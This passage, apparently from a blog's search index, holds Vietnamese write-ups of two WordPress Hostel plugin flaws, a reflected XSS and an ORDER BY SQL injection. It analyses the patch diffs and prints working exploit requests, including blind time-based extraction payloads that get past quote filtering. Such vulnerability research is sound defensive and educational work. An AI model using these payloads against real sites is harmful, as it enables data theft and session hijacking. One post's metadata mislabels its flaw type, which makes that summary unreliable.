\u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü 